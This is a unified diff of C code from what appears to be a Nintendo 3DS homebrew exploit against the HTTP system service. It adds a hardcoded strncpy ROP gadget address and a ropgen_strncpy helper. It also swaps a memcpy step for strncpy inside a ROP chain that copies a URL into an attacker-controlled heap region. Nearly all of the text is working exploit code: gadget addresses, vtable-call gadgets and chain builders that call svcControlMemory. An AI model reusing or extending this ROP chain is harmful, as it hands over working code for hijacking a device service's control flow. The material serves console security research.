@@ -53,6 +53,7 @@ u32 ROP_CMPR0R1_OVERWRITER0_BXLR = 0x00118400;//"cmp r0, r1" On mismatch r0 is s
 u32 ROP_CONDEQ_BXLR_VTABLECALL = 0x00119a24;//"beq <addr of bx-lr>" Otherwise, ip = *r0(vtable ptr), ip = *(ip+0xcc), then bx ip.
 
 u32 ROP_strncmp = 0x001064dc;
+u32 ROP_strncpy = 0x0010dc88;
 u32 ROP_memcpy = 0x0010d274;
 u32 ROP_svcControlMemory = 0x00100770;
 u32 ROP_CreateContext = 0x0011689c;//This is the actual CreateContext function called via the *(obj+16) vtable. inr0=_this inr1=urlbuf* inr2=urlbufsize inr3=u8 requestmethod insp0=u32* out contexthandle
@@ -343,6 +344,17 @@ void ropgen_svcControlMemory(u32 **ropchain, u32 *http_ropvaddr, u32 outaddr, u3
 	params[5] = perm;
 
 	ropgen_callfunc(ropchain, http_ropvaddr, ROP_svcControlMemory, params);
+}
+
+void ropgen_strncpy(u32 **ropchain, u32 *http_ropvaddr, u32 dest, u32 src, u32 n)
+{
+	u32 params[7] = {0};
+
+	params[0] = dest;
+	params[1] = src;
+	params[2] = n;
+
+	ropgen_callfunc(ropchain, http_ropvaddr, ROP_strncpy, params);
 }
 
 void ropgen_memcpy(u32 **ropchain, u32 *http_ropvaddr, u32 dst, u32 src, u32 size)//Total size: see ropgen_callfunc.
@@ -675,7 +687,7 @@ Result setuphaxx_httpheap_sharedmem()
 	ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x18, 1);//Write the URL ptr to ropheap+0x18.
 	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below memcpy with the above URL ptr.
 
-	ropgen_memcpy(&ropchain, &ropvaddr, ropheap+0x100, 0, 0x100);//Copy the first 0x100-bytes of the URL to ropheap+0x100.
+	ropgen_strncpy(&ropchain, &ropvaddr, ropheap+0x100, 0, 0xff);//strncpy(ropheap+0x100, createcontext_inputurl, 0xff);
 
 	ropgen_writeu32(&ropchain, &ropvaddr, 0x0, ropheap+0x1c, 1);//*((u32*)(ropheap+0x1c)) = 0;
 
